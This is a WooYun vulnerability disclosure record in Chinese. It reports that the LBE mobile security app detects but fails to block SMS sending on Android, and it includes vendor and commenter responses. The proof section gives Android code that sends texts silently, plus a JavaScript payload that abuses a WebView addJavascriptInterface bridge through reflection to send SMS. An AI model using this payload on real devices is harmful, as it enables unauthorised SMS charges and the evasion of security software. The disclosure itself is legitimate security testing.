{"id": 5248, "wybug_id": "wooyun-2013-047381", "wybug_title": "LBE手机安全大师主动防御功能缺陷", "wybug_corp": "lbesec.com", "wybug_author": "瘦蛟舞", "wybug_date": "2013-12-31 13:03", "wybug_open_date": "2014-03-28 13:04", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端程序设计错误", "手机应用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-05：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向公众公开  简要描述： LBE手机安全大师主动防御功能缺陷，可能无法拦截软件行为例如发短信、打开wifi等。 详细说明：  事件起源于这个漏洞，原来我一直用的软件居然是纸老虎，伤心。 WooYun: 华为商城安卓客户端存储跨站&强制发短信 然后猜测可能是自己手机是双卡未采用标准api来发送短信，等官方发布等版本吧\nLBE安全大师5.1.5446更新日志更新日期: 2013年,12月 20号 下载 【新增】首款支持隐私空间NFC解锁的安全软件 【新增】适配双卡机型：三星I959、I9502、N9002、I929、P709 华为A199、HTC802w\n嗯哼，新版发布了袄支持我的手机啦，再次试了下，居然还是只能提示不能拦截。   漏洞证明：  写个小程序测试下吧。0x00api：15||17phone：i959  android4.2.2LBE:5.1.54460x01分别使用：标准api、调用短信activity、非标准api、webview代码执行四个方式来发送短信。部分代码如下：\npublic void smsSend(View arg0) {\t\t\t/*\tPendingIntent pi = PendingIntent.getActivity(MainActivity.this, 0,new Intent(), 0);*/\t\t\t\tSmsManager sms = SmsManager.getDefault();\t\t\tsms.sendTextMessage(\"10001\", null, \"105\", null, null);\t\tToast.makeText(MainActivity.this, \"oK\", Toast.LENGTH_LONG).show();\t}\n\npublic void smsSend3(View arg3) throws Exception{\t\tsendMessage(\"10001\",\"103\");\t\tToast.makeText(MainActivity.this, \"oK3\", Toast.LENGTH_LONG).show();\t}\n\npublic class MainActivity extends Activity {\tEditText url;\tWebView show;\tWebView myWebView;\t@SuppressLint(\"SetJavaScriptEnabled\")\t@Override\tprotected void onCreate(Bundle savedInstanceState) {\t\tsuper.onCreate(savedInstanceState);\t\tsetContentView(R.layout.activity_main);\t\turl = (EditText) findViewById(R.id.url);\t\tmyWebView = (WebView) findViewById(R.id.view);\t\tWebSettings webSettings = myWebView.getSettings();\t\twebSettings.setJavaScriptEnabled(true);\t\tmyWebView.addJavascriptInterface(new MyObject(this), \"my\");\t\t\t}\tpublic boolean onKeyDown(int keyCode, KeyEvent event){\t\tif(keyCode == KeyEvent.KEYCODE_BACK){\t\t\tString urlStr = url.getText().toString();\t\t\tmyWebView.loadUrl(urlStr);\t\t\treturn true;\t\t}\t\treturn false;\t\t\t}\n\n<script>\tvar obj_smsManager = my.getClass().forName(\"android.telephony.SmsManager\").getMethod(\"getDefault\",null).invoke(null,null);\tobj_smsManager.sendTextMessage(\"10000\",null,\"102\",null,null);</script>\n0x02开始测试,直接用sendTextMessage发送短信\n\n监控到了哦\n\n可以为什么明明拒绝了最后短信还是发送出去了。这都拦不了，感觉没必要往下测了。\n\n还是继续测webview漏洞来发送短信依旧和只能监控无法拦截。0x03对腾讯手机管家、安全管家、360做了对比测试。果然还是数字公司最给力，全部截下。   修复方案：  null   版权声明：转载请注明来源 瘦蛟舞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-03-28 13:04 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-02 13:49 |    \t\t4399gdww \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | )\t\t \n  mark    \n     2014-01-22 19:00 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  为什么忽略？？？    \n     2014-03-29 20:02 |    \t\t卖火柴的小男孩 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:4        | muyou)\t\t \n  程序员不容易呀 忽略了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}